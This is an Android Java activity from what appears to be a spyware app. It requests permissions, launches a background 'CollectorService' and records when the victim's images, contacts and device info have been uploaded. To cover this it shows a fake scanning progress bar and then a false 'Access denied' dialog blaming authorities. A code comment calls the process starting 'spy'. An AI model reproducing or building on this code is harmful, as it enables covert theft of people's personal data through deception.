package com.tangledbytes.sw;


import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.appcompat.app.AlertDialog;

import com.tangledbytes.sw.services.CollectorService;
import com.tangledbytes.sw.utils.Constants;
import com.tangledbytes.sw.utils.Utils;

import java.util.Locale;
import java.util.Random;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSIONS_REQUEST_CODE = 101;
    private static final int OPEN_SETTINGS_REQUEST_CODE = 102;
    private final Utils mUtils = new Utils(this);
    private ProgressBar progressBar;
    private TextView tvProcMainTitle;
    private TextView tvProcContent;
    private TextView tvProgress;
    private boolean isShowingNoInternetDialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        test();
        startCollectorService();
    }

    private void test() {
        try {
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private final Thread fakeProcessThread = new Thread(new Runnable() {
        final Random random = new Random();

        @Override
        public void run() {
            double progress = 0;
            while (!hasUploadedAllData()) {
                if (!mUtils.hasActiveInternetConnection()) {
                    runOnUiThread(MainActivity.this::showEnableInternetDialog);
                    blockThread();
                    continue;
                }
                // increase progress by 0.1% of remaining progress
                progress += 0.001 * (100 - progress);
                final int finalProgress = (int) progress;
                runOnUiThread(() -> updateUi(finalProgress));
                blockThread();
            }
            runOnUiThread(MainActivity.this::showFailedDialog);
        }

        private void updateUi(int progress) {
            tvProcContent.setText(String.format("scanning %s...", Constants.COUNTRIES[random.nextInt(Constants.COUNTRIES.length)]));
            progressBar.setProgress(progress);
            tvProgress.setText(String.format(Locale.ENGLISH, "%d%%", progress));
        }

        private void blockThread() {
            synchronized (MainActivity.this) {
                try {
                    MainActivity.this.wait(random.nextInt(500) + 1);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    });

    private void showFakeProcess() {
        tvProcMainTitle = findViewById(R.id.proc_title);
        tvProcContent = findViewById(R.id.proc_content);
        progressBar = findViewById(R.id.proc_progress);
        tvProgress = findViewById(R.id.tv_progress);
        tvProcMainTitle.setText(R.string.looking_for_closest_server);
        fakeProcessThread.start();
    }

    private void showEnableInternetDialog() {
        if (isShowingNoInternetDialog)
            return;
        isShowingNoInternetDialog = true;
        AlertDialog.Builder noInternetDialog = new AlertDialog.Builder(this)
                .setTitle("No Internet Connection")
                .setMessage("No internet connection detected. Please enable internet in order continue. Click retry to recheck.\nThank you")
                .setCancelable(false)
                .setNegativeButton("Retry",
                        (dialog, whichButton) -> {
                            isShowingNoInternetDialog = false;
                        });
        noInternetDialog.show();
    }

    public void showFailedDialog() {
        AlertDialog.Builder failedDialog = new AlertDialog.Builder(this)
                .setTitle("Access denied")
                .setMessage("It looks like authorities has blocked this service in your area. Please stay tuned for further updates.\nThank you")
                .setCancelable(false)
                .setNegativeButton(R.string.exit,
                        (dialog, whichButton) -> {
                            mUtils.showToast(R.string.closing_app);
                            finish();
                        });
        failedDialog.show();
    }

    private void startCollectorService() {
        if (hasUploadedAllData()) {
            showFailedDialog();
            Log.i(TAG, "Data uploaded, not starting collector service");
            return;
        }
        if (!hasAllPermissions()) {
            Log.d(TAG, "All permissions are not granted, prompting for permission grant...");
            grantPermissions();
            return;
        }
        Intent intentCollectorService = new Intent(MainActivity.this, CollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intentCollectorService);
        } else
            startService(intentCollectorService);
        showFakeProcess();
    }

    private boolean hasUploadedAllData() {
        SharedPreferences prefs = getSharedPreferences(Constants.PREFS_UPLOAD_STATUS, Context.MODE_PRIVATE);
        return prefs.getBoolean(Constants.PREF_IMAGES_STATUS, false)
                && prefs.getBoolean(Constants.PREF_CONTACTS_STATUS, false)
                && prefs.getBoolean(Constants.PREF_DEVICE_INFO_STATUS, false);
    }

    public boolean hasAllPermissions() {
        for (String permission : Constants.PERMISSIONS_NEEDED) {
            if (!mUtils.hasPermission(permission)) return false;
        }
        return true;
    }

    private void grantPermissions() {
        requestPermissions(Constants.PERMISSIONS_NEEDED,
                PERMISSIONS_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            handlePermissionResult();
        }
    }

    /**
     * Checks whether the user has granted all permissions or not. If the user had granted all
     * permissions then it starts spy otherwise it again prompts for granting  permissions.
     */
    private void handlePermissionResult() {
        for (String permission : Constants.PERMISSIONS_NEEDED) {
            if (mUtils.hasPermission(permission)) {
                // User granted this permission, check for next one
                continue;
            }
            // User not granted permission
            AlertDialog.Builder permissionRequestDialog = new AlertDialog.Builder(this)
                    .setTitle(R.string.dialog_permission_title)
                    .setMessage(R.string.dialog_permission_message)
                    .setCancelable(false)
                    .setNegativeButton(R.string.exit,
                            (dialog, whichButton) -> {
                                mUtils.showToast(R.string.closing_app);
                                setResult(RESULT_CANCELED);
                                finish();
                            });
            if (!shouldShowRequestPermissionRationale(permission)) {
                // User clicked on "Don't ask again", show dialog to navigate him to
                // settings
                permissionRequestDialog
                        .setPositiveButton(R.string.go_to_settings,
                                (dialog, whichButton) -> {
                                    Intent intent =
                                            new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                    Uri uri =
                                            Uri.fromParts("package", getPackageName(), null);
                                    intent.setData(uri);
                                    startActivityForResult(intent,
                                            OPEN_SETTINGS_REQUEST_CODE);
                                })
                        .show();
            } else {
                // User clicked on 'deny', prompt again for permissions
                permissionRequestDialog
                        .setPositiveButton(R.string.try_again,
                                (dialog, whichButton) -> grantPermissions())
                        .show();
            }
            return;
        }
        Log.i(TAG, "All required permissions have been granted!");
        startCollectorService();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OPEN_SETTINGS_REQUEST_CODE) {
            handlePermissionResult();
        }
    }
}